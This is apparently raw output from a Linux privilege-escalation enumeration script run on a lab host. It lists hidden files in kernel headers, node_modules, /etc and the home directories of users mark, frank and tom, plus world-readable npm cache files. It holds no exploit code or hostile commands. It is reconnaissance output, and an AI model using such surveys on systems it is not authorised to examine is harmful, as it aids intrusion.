-rw-r--r-- 1 root root 190367 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.config.old
-rw-r--r-- 1 root root 820 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 54 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/dtc/.gitignore
-rw-r--r-- 1 root root 167 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/kconfig/.gitignore
-rw-r--r-- 1 root root 31 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/kconfig/lxdialog/.gitignore
-rw-r--r-- 1 root root 42 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/genksyms/.gitignore
-rw-r--r-- 1 root root 154 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/.gitignore
-rw-r--r-- 1 root root 55 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/mod/.gitignore
-rw-r--r-- 1 root root 21 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/selinux/mdp/.gitignore
-rw-r--r-- 1 root root 11 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/selinux/genheaders/.gitignore
-rw-r--r-- 1 root root 13 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/basic/.gitignore
-rw-r--r-- 1 root root 12 Jan 10  2016 /usr/src/linux-headers-4.4.0-87/scripts/gdb/linux/.gitignore
-rw-r--r-- 1 root root 655 Aug 31  2017 /home/mark/.profile
-rw-r--r-- 1 root root 220 Aug 31  2017 /home/mark/.bash_logout
-rwxr-xr-x 1 root root 0 Sep  3  2017 /home/mark/.mongorc.js
-rw-r----- 1 root root 0 Sep  3  2017 /home/mark/.dbshell
-rw-r--r-- 1 root root 3771 Aug 31  2017 /home/mark/.bashrc
-rw-r--r-- 1 root root 655 Aug 31  2017 /home/frank/.profile
-rw-r--r-- 1 root root 220 Aug 31  2017 /home/frank/.bash_logout
-rw-r--r-- 1 root root 3771 Aug 31  2017 /home/frank/.bashrc
-rw-r--r-- 1 root root 655 Aug 29  2017 /home/tom/.profile
-rw-r--r-- 1 root root 220 Aug 29  2017 /home/tom/.bash_logout
-rwxr-xr-x 1 root root 0 Aug 30  2017 /home/tom/.mongorc.js
-rw-r----- 1 root root 0 Sep  3  2017 /home/tom/.dbshell
-rw-r--r-- 1 root root 3771 Aug 29  2017 /home/tom/.bashrc
-rw-r--r-- 1 root root 1319 Aug 29  2017 /var/lib/apparmor/profiles/.apparmor.md5sums
-rw-r--r-- 1 root root 70 Jul 11  2013 /var/www/myplace/node_modules/utils-merge/.travis.yml
-rw-r--r-- 1 root root 229 Mar  6  2017 /var/www/myplace/node_modules/qs/test/.eslintrc
-rw-r--r-- 1 root root 5 Dec 23  2015 /var/www/myplace/node_modules/qs/.eslintignore
-rw-r--r-- 1 root root 532 Mar  6  2017 /var/www/myplace/node_modules/qs/.eslintrc
-rw-r--r-- 1 root root 4140 Mar  6  2017 /var/www/myplace/node_modules/qs/.jscs.json
-rw-r--r-- 1 root root 259 Nov 21  2016 /var/www/myplace/node_modules/iconv-lite/.travis.yml
-rw-r--r-- 1 root root 44 Jan 18  2016 /var/www/myplace/node_modules/iconv-lite/.npmignore
-rw-r--r-- 1 root root 180 Feb 10  2017 /var/www/myplace/node_modules/debug/.eslintrc
-rw-r--r-- 1 root root 140 Feb 10  2017 /var/www/myplace/node_modules/debug/.travis.yml
-rw-r--r-- 1 root root 46 Feb 10  2017 /var/www/myplace/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 72 Apr 20  2017 /var/www/myplace/node_modules/debug/.npmignore
-rw-r--r-- 1 root root 29 Jan 28  2014 /var/www/myplace/node_modules/cookie-signature/.npmignore
-rw-r--r-- 1 root root 180 Dec 25  2016 /var/www/myplace/node_modules/finalhandler/node_modules/debug/.eslintrc
-rw-r--r-- 1 root root 140 Dec 25  2016 /var/www/myplace/node_modules/finalhandler/node_modules/debug/.travis.yml
-rw-r--r-- 1 root root 46 Dec 25  2016 /var/www/myplace/node_modules/finalhandler/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 72 May 18  2017 /var/www/myplace/node_modules/finalhandler/node_modules/debug/.npmignore
-rw-r--r-- 1 root root 93 Jun 13  2017 /var/www/myplace/node_modules/require_optional/.travis.yml
-rw-r--r-- 1 root root 529 Feb  3  2016 /var/www/myplace/node_modules/require_optional/.npmignore
-rw-r--r-- 1 root root 229 Jun 14  2017 /var/www/myplace/node_modules/express/node_modules/qs/test/.eslintrc
-rw-r--r-- 1 root root 5 May 24  2017 /var/www/myplace/node_modules/express/node_modules/qs/.eslintignore
-rw-r--r-- 1 root root 533 Jun 28  2017 /var/www/myplace/node_modules/express/node_modules/qs/.eslintrc
-rw-r--r-- 1 root root 399 Jun 28  2017 /var/www/myplace/node_modules/express/node_modules/qs/.editorconfig
-rw-r--r-- 1 root root 180 Dec 25  2016 /var/www/myplace/node_modules/express/node_modules/debug/.eslintrc
-rw-r--r-- 1 root root 140 Dec 25  2016 /var/www/myplace/node_modules/express/node_modules/debug/.travis.yml
-rw-r--r-- 1 root root 46 Dec 25  2016 /var/www/myplace/node_modules/express/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 72 May 18  2017 /var/www/myplace/node_modules/express/node_modules/debug/.npmignore
-rw-r--r-- 1 root root 76 May 30  2016 /var/www/myplace/node_modules/safe-buffer/.travis.yml
-rw-r--r-- 1 root root 1476 Mar 29  2017 /var/www/myplace/node_modules/readable-stream/.travis.yml
-rw-r--r-- 1 root root 74 Dec 19  2016 /var/www/myplace/node_modules/readable-stream/.npmignore
-rw-r--r-- 1 root root 180 Dec 25  2016 /var/www/myplace/node_modules/express-session/node_modules/debug/.eslintrc
-rw-r--r-- 1 root root 140 Dec 25  2016 /var/www/myplace/node_modules/express-session/node_modules/debug/.travis.yml
-rw-r--r-- 1 root root 46 Dec 25  2016 /var/www/myplace/node_modules/express-session/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 72 May 18  2017 /var/www/myplace/node_modules/express-session/node_modules/debug/.npmignore
-rw-r--r-- 1 root root 0 Feb  6  2015 /var/www/myplace/node_modules/mime/.npmignore
-rw-r--r-- 1 root root 99 Mar 14  2017 /var/www/myplace/node_modules/ipaddr.js/.travis.yml
-rw-r--r-- 1 root root 19 Mar 14  2017 /var/www/myplace/node_modules/ipaddr.js/.npmignore
-rw-r--r-- 1 root root 11 Jun 22  2017 /var/www/myplace/node_modules/string_decoder/.npmignore
-rw-r--r-- 1 root root 180 Dec 25  2016 /var/www/myplace/node_modules/send/node_modules/debug/.eslintrc
-rw-r--r-- 1 root root 140 Dec 25  2016 /var/www/myplace/node_modules/send/node_modules/debug/.travis.yml
-rw-r--r-- 1 root root 46 Dec 25  2016 /var/www/myplace/node_modules/send/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 72 May 18  2017 /var/www/myplace/node_modules/send/node_modules/debug/.npmignore
-rw-r--r-- 1 root root 198 Aug  8  2017 /var/www/myplace/node_modules/mongodb/.eslintrc
-rw-r--r-- 1 root root 46 Aug  8  2017 /var/www/myplace/node_modules/mongodb/.coveralls.yml
-rw-r--r-- 1 root root 48 Dec 10  2015 /var/www/myplace/node_modules/isarray/.travis.yml
-rw-r--r-- 1 root root 13 Dec 10  2015 /var/www/myplace/node_modules/isarray/.npmignore
-rw-r--r-- 1 root root 112 Feb 26  2016 /var/www/myplace/node_modules/process-nextick-args/.travis.yml
-rw-r--r-- 1 root root 198 Aug  7  2017 /var/www/myplace/node_modules/mongodb-core/.eslintrc
-rw-r--r-- 1 root root 46 Aug  7  2017 /var/www/myplace/node_modules/mongodb-core/.coveralls.yml
-rw-r--r-- 1 root root 93 Jun 13  2017 /var/scheduler/node_modules/require_optional/.travis.yml
-rw-r--r-- 1 root root 529 Feb  3  2016 /var/scheduler/node_modules/require_optional/.npmignore
-rw-r--r-- 1 root root 76 May 30  2016 /var/scheduler/node_modules/safe-buffer/.travis.yml
-rw-r--r-- 1 root root 1476 Mar 29  2017 /var/scheduler/node_modules/readable-stream/.travis.yml
-rw-r--r-- 1 root root 74 Dec 19  2016 /var/scheduler/node_modules/readable-stream/.npmignore
-rw-r--r-- 1 root root 11 Jun 22  2017 /var/scheduler/node_modules/string_decoder/.npmignore
-rw-r--r-- 1 root root 198 Aug  8  2017 /var/scheduler/node_modules/mongodb/.eslintrc
-rw-r--r-- 1 root root 46 Aug  8  2017 /var/scheduler/node_modules/mongodb/.coveralls.yml
-rw-r--r-- 1 root root 48 Dec 10  2015 /var/scheduler/node_modules/isarray/.travis.yml
-rw-r--r-- 1 root root 13 Dec 10  2015 /var/scheduler/node_modules/isarray/.npmignore
-rw-r--r-- 1 root root 112 Feb 26  2016 /var/scheduler/node_modules/process-nextick-args/.travis.yml
-rw-r--r-- 1 root root 198 Aug  7  2017 /var/scheduler/node_modules/mongodb-core/.eslintrc
-rw-r--r-- 1 root root 46 Aug  7  2017 /var/scheduler/node_modules/mongodb-core/.coveralls.yml
-rw-r--r-- 1 root root 1391 Aug 29  2017 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.hourly/.placeholder
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.monthly/.placeholder
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.weekly/.placeholder
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.d/.placeholder
-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
-rw-r--r-- 1 root root 220 Sep  1  2015 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 3771 Sep  1  2015 /etc/skel/.bashrc
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.daily/.placeholder
-rw------- 1 root root 0 Aug  1  2017 /etc/.pwd.lock
-rw-r--r-- 1 root root 1264 Aug 30  2017 /etc/init.d/.depend.boot
-rw-r--r-- 1 root root 955 Aug 30  2017 /etc/init.d/.depend.start
-rw-r--r-- 1 root root 1019 Aug 30  2017 /etc/init.d/.depend.stop


[-] World-readable files within /home:
-rw-r--r-- 1 root root 655 Aug 31  2017 /home/mark/.profile
-rw-r--r-- 1 root root 220 Aug 31  2017 /home/mark/.bash_logout
-rwxr-xr-x 1 root root 0 Sep  3  2017 /home/mark/.mongorc.js
-rw-r--r-- 1 root root 3771 Aug 31  2017 /home/mark/.bashrc
-rw-r--r-- 1 root root 655 Aug 31  2017 /home/frank/.profile
-rw-r--r-- 1 root root 220 Aug 31  2017 /home/frank/.bash_logout
-rw-r--r-- 1 root root 3771 Aug 31  2017 /home/frank/.bashrc
-rw-r--r-- 1 root root 655 Aug 29  2017 /home/tom/.profile
-rw-r--r-- 1 root root 220 Aug 29  2017 /home/tom/.bash_logout
-rw-r--r-- 1 root root 171 Sep  3  2017 /home/tom/.npm/anonymous-cli-metrics.json
-rw-r--r-- 1 root root 2538 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/cb/fb/d7c6f4a5f05680769a5bfd29154209fa7ccc1a3f71e5c9ae326c3ddcb086
-rw-r--r-- 1 root root 1251 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/cb/1b/6f71f1ef494d6e9f33a552acb357d9d27f999a80fbe65f86298e4d38ec2a
-rw-r--r-- 1 root root 1196 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/88/f8/1a68df18759c778c269ba8e37cfcac71b1a13922434871943e3ed626ec18
-rw-r--r-- 1 root root 1290 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/88/e3/9855d390a03aca7f01cd512c5c72b6ba0b3f9cdda5cd94e87a0abe79d619
-rw-r--r-- 1 root root 1256 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/08/d6/df6c568b949ee15b6ff349b7393f8818c67566505a4e5184d3a12eadf8c5
-rw-r--r-- 1 root root 914 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/08/b5/f6169b7652b7aa54e683db4fc89274d7a8138ac446c1daa1ff4493ec585d
-rw-r--r-- 1 root root 819 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/49/c0/ba2f911b7153b86140605344091d3965cd3796c001287fb4f1071e12d58c
-rw-r--r-- 1 root root 1345 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/49/9f/1d895ed2350023ec00cbb32c0880ef4585fd41958f5e7be0790bd14c6c3c
-rw-r--r-- 1 root root 2585 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/13/29/572bf43d686299dd8263b106410c0cdb26df1485ef40041d2172cc942990
-rw-r--r-- 1 root root 1136 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/ac/22/9f2493359f5004744512f14668ceb5857335906c7f12dd7fe07bcbb22261
-rw-r--r-- 1 root root 2568 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/92/f0/32fa9b3db5e8011628dd42b81c2806851b6ebb11a297b802b02cd80305e5
-rw-r--r-- 1 root root 921 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/b2/e0/fa49c23f23d6c28a51f355e0373a9c4fa829f96a64e7ef1e2fae25dc30bd
-rw-r--r-- 1 root root 2543 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/90/81/b282fc65fba2629a78ffb2c85ff35c7028db687a67d0498adaaa3f3215c1
-rw-r--r-- 1 root root 1254 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/47/4d/e2eb4d9497854942ff685d9ad25d93cff12778d935828d4eb5e3d86d0ca4
-rw-r--r-- 1 root root 1279 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/af/a5/1dec11d97c90f5ffe55ae47f6516c62fae93aa44762dd8ce75794825f6e2
-rw-r--r-- 1 root root 2546 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/af/a1/ab9d77cb026b86ef88670d9957d0288759ae1f0ae20a97de8e3182495128
-rw-r--r-- 1 root root 1064 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/17/20/acf993292f006799e31b018beb79797adc277cbd27511862717f1b4ba08a
-rw-r--r-- 1 root root 1333 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/ef/81/36f6ddb251fbf73b125e449b18322a4306a9b2ab514a51d4d4b7a1cee376
-rw-r--r-- 1 root root 1270 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/fe/d4/2b6db51f1f91e3704e88dc53fb0eddd7782c90d848a38275e12e5ebfa95c
-rw-r--r-- 1 root root 2581 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/f6/3d/f2f0f797a9b8bc04ff5a617328dd807c77dc2d1a81c8243f65499cc44d81
-rw-r--r-- 1 root root 1250 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/8c/ea/49bd724407ad4d5e5d24c487d3efc694f899395332c84cc50f18e2425b74
-rw-r--r-- 1 root root 888 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/2a/70/3555fa0cd3954cec3a13d6c983b28a4ea23806a6757871f8b5f5d8d979ac
-rw-r--r-- 1 root root 1117 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/2a/43/c711c5540afd4b1ba86bfed7411fd56d088014896a73b2ab4ff22534b2c3
-rw-r--r-- 1 root root 3858 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/fb/4b/0fb3ce45fb690a1851537ed333cfcfd6be1e8b868b655055069aab25adf3
-rw-r--r-- 1 root root 1111 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/27/de/dea5b4c25844692071ef0be97061366c70267b913a05f8fbf80045476443
-rw-r--r-- 1 root root 1256 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/3d/4f/bffa223592d3cddd76d7d24e7ce703738ff975edf4bad00ac36cab6f6189
-rw-r--r-- 1 root root 811 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/ae/47/ae396bbb9d6732155cb720104c76a82a2a24d43a5c5661f17652143191cf
-rw-r--r-- 1 root root 1004 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/ae/6a/0b4637a4277eb1592992b56a83e14e53a7ef19a4dfdee32e06cd884af885
-rw-r--r-- 1 root root 2573 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/66/dc/91ce4ba83e8b37347df1c0ee838f5e4353d22219c5d2aa9804507c18ec71
-rw-r--r-- 1 root root 1007 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/66/c4/c5b0ec86bd97537165922683574b6a7ed2e18de5e887b6f783d74e64a859
-rw-r--r-- 1 root root 2605 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/12/61/455290931b30bfbc94a86ab8e6efc0d0698c0703ca98485308d5df7d3750
-rw-r--r-- 1 root root 1000 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/12/d5/bb12535cf3c546acf37f94c689acbe7d7cf5b7a7e2f64fe0dc1a43e54e16
-rw-r--r-- 1 root root 1036 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/22/0c/36050607ece305167524ab981a4f2b30d0a19b76def144d7c133d7e93c71
-rw-r--r-- 1 root root 935 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/22/ca/6a7afc9a3a0663d9a6621a1bb93a036bd93bba5d54cc8ef205d0e87c4145
-rw-r--r-- 1 root root 1246 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/da/35/f3f029ca519373ff15df253071428254dcfad82e1d3c4eb265563c179397
-rw-r--r-- 1 root root 2564 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/f3/2c/80267cf9b394a43404ccabe3e574f5fd89b769b43be625b75ff9b1b4a2ee
-rw-r--r-- 1 root root 872 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/02/d5/bfe14200fbb30e77813d95c53953f570595996aef52797f71384d3e897f6
-rw-r--r-- 1 root root 876 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/02/bd/1a25f83f0db680d9f974aca74287bbe2b6a9d081349f441251b0588320cc
-rw-r--r-- 1 root root 853 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/72/3e/a9f83d0ae2694a94cebf93ae12a2f2f6ee732a4742255127d218de7cf597
-rw-r--r-- 1 root root 891 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/72/f5/9fed8fd8488c9538fc52ab016d1b164bca7a4f792d0b5f5047c3d681e190
-rw-r--r-- 1 root root 2577 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/72/a7/30c77e6f637fd471e7f3e0402cae756c6db1d8dc65d845240361886dc66d
-rw-r--r-- 1 root root 1186 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/64/17/566b3f51b41fae7dbf0388b1e25646a6b71607252abb83dba47dae5334da
-rw-r--r-- 1 root root 1270 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/6c/6f/8e7e8934679b7b49b8240b1f2dcb66c25a5bd17f9629f8fe0ea634cab93c
-rw-r--r-- 1 root root 2555 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/6c/b8/bf3defaf56a777b0a2db86bdc94ecb2191281a9ae7585d3ff39ed841c8f5
-rw-r--r-- 1 root root 1214 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/73/06/29ff5cc69fecb32f777b895933f24710884802ae6afc8a135bf10b8c4e9a
-rw-r--r-- 1 root root 1249 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/9c/d7/a34d02e9d21f305a20fa404ffe269ebd33d84a439decb19d2e24945bf666
-rw-r--r-- 1 root root 1189 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/03/c3/ae5f00d3a933178d891f65b2838a049df7f1266f40c51f8896f853f452ff
-rw-r--r-- 1 root root 2569 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/03/c6/b08c3c1e7780180f5329e1963e92ea160416e9dbbfab749ba4bf22a12563
-rw-r--r-- 1 root root 1202 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/a5/00/e76a9d826f40c6f8b55f35eead350e1bac956da51d46d4e2f7a6c32fcabb
-rw-r--r-- 1 root root 802 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/a5/8e/ba4e23e3ee6516fc20e94d62be57e0a89ed21cfaa275fa3883383cdc0e75
-rw-r--r-- 1 root root 1016 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/82/f1/39657b983c6d4a2d6fb48e4137335d977e1ee42b7e6ae16c078af81310e3
-rw-r--r-- 1 root root 1280 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/82/66/cb93764173e498d0136c1e3d5c6fe94e25162332bce8f86dc18081de9f24
-rw-r--r-- 1 root root 1052 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/79/ac/14bb90d4fab255d39281dab1ab040c7421445c586d3876263e7b95aa4b1e
-rw-r--r-- 1 root root 1220 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/38/c1/a3258dca7a9b5f012aebc722961262e91dd4c7d7170ef10b36e252ace94d
-rw-r--r-- 1 root root 1332 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/38/9b/a159110dd95908541d0f676317e991a05a254374d3a47bbbb997237f472e
-rw-r--r-- 1 root root 1252 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/09/6b/77dbe363c9ffd7433d428393ac459d341a61ad5412ab2cb92caa3f60b333
-rw-r--r-- 1 root root 856 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/26/34/a73c9bffa9f80689ef98f956e042fe008e60ecc435907cc3eb75bfbd6554
-rw-r--r-- 1 root root 2533 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/7f/c3/dc0657b650edb6ea8e350ae8c6dd6cee5ca84fcc91d9d0b666cf225a139b
-rw-r--r-- 1 root root 858 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/1c/df/a7631eb2f94791cc064a167d8953e50cd54e910436008aa8c0577358e19b
-rw-r--r-- 1 tom tom 3934 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/d6/47/0b796a99c82c8fcdcdc3380884e2104085a357ad0ac568827bbf53c1f6bf
-rw-r--r-- 1 root root 1306 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/d6/47/2d4e4b363564f0b3d6e59012bb07573fb947a866841f5259a96439aa3964
-rw-r--r-- 1 root root 1256 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/2e/cd/fb8d3e72eda4233605fb66426595607d02143b4b831d8fbddf9f7615c907
-rw-r--r-- 1 root root 875 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/83/ae/9f8a7e560c40bbfdf0af11cda51f4098243fe27e3f552cd3da29ec8320d4
-rw-r--r-- 1 root root 1053 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/83/40/13e44d75428b7fcfc310ff12d87ee2fb6280f58549de752616f5af7b1b0b
-rw-r--r-- 1 tom tom 3946 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/83/99/b234a49b29967a32c80fd007173f8085aeed5263a555bfc260d825ad2f69
-rw-r--r-- 1 root root 2578 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/b0/4a/c18a99a2710b49b5a3a1121226be4940f623f8ba056f8108a634ed347da9
-rw-r--r-- 1 root root 1249 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/c1/95/12bb42c22a6ef46ae01cc287d4fa5b3a9563da7b280f69a87974af2bdd22
-rw-r--r-- 1 tom tom 3955 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/c1/8e/b2d9565fe60306da42efbbd6978e09bc583a7fa954ad3b148dc9c4793e51
-rw-r--r-- 1 tom tom 3925 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/34/3a/850b354b423abdd01b0be44d3bfeeec4a7185ca7a748c7172352dc697b83
-rw-r--r-- 1 root root 1204 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/93/36/d5e397926ee94b1668a1aa689da8fd5c72c813c43b95256aa7a6c3f85f54
-rw-r--r-- 1 root root 2616 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/93/31/9f96e29572a9b3bd880f19dde2e443b99ec81a4258f3e56ce1c4fff64852
-rw-r--r-- 1 tom tom 3991 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/93/c9/a0dbbd75ae853d67c5f17925e577e7c57bbe2b2ab879ccf8537edd7bad8f
-rw-r--r-- 1 root root 2609 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/93/fd/b19664dd8a74b7863b83af02f3f1327cb564b9f7bd0268d2bbebe3dc8bef
-rw-r--r-- 1 root root 1292 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/81/d1/48e815847976fbb7438893cd21c815c76d42d879395f7c49845956884c59
-rw-r--r-- 1 tom tom 3932 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/eb/d5/caf6039ef9fd729e3b7032f2246dc0fb17b5dba9d9539d2414371a4bddca
-rw-r--r-- 1 tom tom 5221 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/ff/d3/eca629ba696cac5a91e13f61bb768d7cbf82072f798d17071572ab3943f2
-rw-r--r-- 1 root root 826 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/25/17/d60fec82c30a319b85b35f22c1ef85eb8033a244e1d77a9184e46bcdec3c
-rw-r--r-- 1 root root 2569 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/1b/f8/6bfdea9432e5ae5a2f44229570f5fbde6d10fa644381825e6d761092e164
-rw-r--r-- 1 root root 831 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/1b/45/889f17b1528c8e1fb3efd07b9da351505fece30603d66a42edd7131f5994
-rw-r--r-- 1 root root 1317 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/7e/26/da8d6c49d1b7f3fc188c5fb18db4843f41a8b6ba93fd9f3a4a49e26bd05b
-rw-r--r-- 1 root root 818 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/06/fc/6d1916e709fe9e90e305221a233b42655e967a8612136a146a2b3d39f17d
-rw-r--r-- 1 tom tom 3959 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/06/58/e2634c3457eb298ab8542b6282b52ee13829c3c05e1569c13147c0f26693
-rw-r--r-- 1 root root 2586 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/06/5a/98f8c4232b39b6ac68023a0bc186c128dffdec812a144648c26dac71f91a
-rw-r--r-- 1 root root 1229 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/06/ea/be55ce2ff8c42f06ffe8c7641075bdf83f2c65c1380bd8f312e144b691ca
-rw-r--r-- 1 root root 1212 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/fc/4d/28fdb02d02cf749038f1c49aa0ce689618f9ac4bf5ecdc69bd5b03886526
-rw-r--r-- 1 root root 1210 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/fc/bc/262579afb66d7b3a2bc8e10f6044404f13b3c3aecc9780324d113f34c7ca
-rw-r--r-- 1 root root 2561 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/37/92/e818c7d8b7c82df51a6485bed4155a8bc48774c70d38b41ca1332d530719
-rw-r--r-- 1 root root 1226 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/20/db/99ac0f909b49beef0b9875743bee92d8249e47b9dab46cb1be4af638cdfb
-rw-r--r-- 1 root root 2573 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/b5/90/d06ec4d3d605fd2bb31e7b70f39c06d6430c5b389ee5e584f1a080db51b0
-rw-r--r-- 1 root root 1229 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/b5/48/014c9e559c30e0226b565ee4e69523c9c50200289e11855dcf43dd53de21
-rw-r--r-- 1 root root 827 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/b5/65/83f0dbc0184353d5b6d9c34e9668bd285244688658b1a7f5313fdc098731
-rw-r--r-- 1 root root 2591 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/f7/83/f6d745edc6348460207733876a8ee9e9a527c28fd14a23b81f5d00386b04
-rw-r--r-- 1 root root 1201 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/f7/c5/c5f204385e33bf46f56b875b5961e35dc4199e9283d79cf1b5679a93bb75
-rw-r--r-- 1 root root 1285 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/29/1e/bbe951ce5aadd40e0437824483abee50c92456baa4cbab70a9c8684ce6d1
-rw-r--r-- 1 root root 1117 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/29/ce/7d86b6eede02d1425a623c82bb31b2277e1590c4db9c046f56ebc22daedb
-rw-r--r-- 1 root root 1228 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/29/f0/2f1edd4373313cbd899bdfb10fa0acdf376a25dd5eabb8cac8170302cdb8
-rw-r--r-- 1 root root 2545 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/b4/0c/95fcab298b208bfa97e6a4ba87c0b72def0415a285edc2179df9a5b54ecd
-rw-r--r-- 1 root root 2572 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/7a/83/6be996e7250adf9a97984c85c3a7d3c22c795ce5321c44d257e053fd7442
-rw-r--r-- 1 root root 857 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/7a/fa/dbf13b88b7fc39d0988b7cb0fca488b159bc203ee6aaa9541a06a54caca7
-rw-r--r-- 1 root root 817 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/8a/3d/d3ea4d92d91ac1dc76b6ad174e8a28cd1edaf219a12ff19bf3d852b275e6
-rw-r--r-- 1 root root 791 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/0c/40/a0f8b6ed4650fba1bdce3d598725165dfde297436aa3bbd3c591c6fe4f21
-rw-r--r-- 1 root root 772 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/95/52/7b7875637395946c4c3ff72a85b9ff4e811660172608b0036d3144949a59
